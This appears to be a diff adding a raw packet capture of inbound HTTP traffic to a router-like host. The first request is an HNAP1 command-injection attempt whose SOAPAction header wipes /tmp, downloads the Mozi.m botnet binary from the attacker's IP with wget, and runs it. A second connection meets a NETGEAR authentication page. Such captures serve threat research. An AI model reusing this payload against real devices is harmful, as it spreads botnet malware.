@@ -1,0 +1,75 @@
+
+19:01:06.948910 IP (tos 0x0, ttl 52, id 51464, offset 0, flags [DF], proto TCP (6), length 844)
+    125.43.127.44.47486 > 46.21.150.52.80: Flags [P.], cksum 0x86c6 (correct), seq 3213238445:3213239237, ack 1853828172, win 908, options [nop,nop,TS val 115993692 ecr 4294906377], length 792: HTTP, length: 792
+	POST /HNAP1/ HTTP/1.0
+	Host: 46.21.150.52:80
+	Content-Type: text/xml; charset="utf-8"
+	SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://125.43.127.44:42382/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
+	Content-Length: 640
+	
+	<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>
+	
+19:01:06.960523 IP (tos 0x0, ttl 62, id 15885, offset 0, flags [DF], proto TCP (6), length 344)
+    46.21.150.52.80 > 125.43.127.44.47486: Flags [P.], cksum 0xe7bb (correct), seq 1:293, ack 792, win 1004, options [nop,nop,TS val 4294906548 ecr 115993692], length 292: HTTP, length: 292
+	HTTP/1.0 404 Not Found
+	Server: 
+	Date: Sun, 15 Nov 2020 19:01:05 GMT
+	Content-Type: text/html
+	Connection: close
+	
+	<HTML>
+	<HEAD><TITLE>404 Not Found</TITLE></HEAD>
+	<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
+	<H4>404 Not Found</H4>
+	File not found.
+	</BODY>
+	</HTML>
+19:20:08.866791 IP (tos 0x0, ttl 53, id 39722, offset 0, flags [DF], proto TCP (6), length 56)
+    59.126.112.252.57206 > 46.21.150.52.80: Flags [P.], cksum 0xd93d (correct), seq 1731205349:1731205365, ack 2574286419, win 7300, length 16: HTTP, length: 16
+	GET / HTTP/1.1
+19:20:09.016753 IP (tos 0x0, ttl 53, id 39723, offset 0, flags [DF], proto TCP (6), length 282)
+    59.126.112.252.57206 > 46.21.150.52.80: Flags [P.], cksum 0x8025 (correct), seq 16:258, ack 1, win 7300, length 242: HTTP
+19:20:09.037772 IP (tos 0x0, ttl 62, id 4998, offset 0, flags [DF], proto TCP (6), length 1092)
+    46.21.150.52.80 > 59.126.112.252.57206: Flags [P.], cksum 0x675a (correct), seq 1:1053, ack 258, win 980, length 1052: HTTP, length: 1052
+	HTTP/1.1 401 Unauthorized
+	Server: 
+	Date: Sun, 15 Nov 2020 19:20:07 GMT
+	WWW-Authenticate: Basic realm="NETGEAR DGN1000 "
+	Content-Type: text/html
+	Connection: close
+	
+	<html>
+	<head>
+	<META http-equiv="Pragma" CONTENT="no-cache">
+	<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache">	
+	<meta HTTP-EQUIV="Expires" CONTENT="Mon, 06 Jan 1990 00:00:01 GMT"> 
+	
+	
+	<meta name="description" content="DG834N 1049">
+	<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1">
+	
+		
+	 
+	
+	
+	
+	
+	
+	
+	<title> Authorization warning</title>
+	</head>
+	
+	<body bgcolor="#ffffff">
+	<p><font size=4 color="#0099cc" face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>Warning</font></p>
+	
+	<hr color="#0099cc">
+	
+	<p align="center"><b><font size=3 face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>System Authentication Failed.</font></b></p>
+	
+	<p align="center"><BR><font size=-1 face='Arial,Helvetica,Geneva,Swiss,SunSans-Regular,sans-serif'>
+	Please contact your system administrator for the correct information.</font></p>
+	
+	</body>
+	</html>
+	</BODY>
+	</HTML>
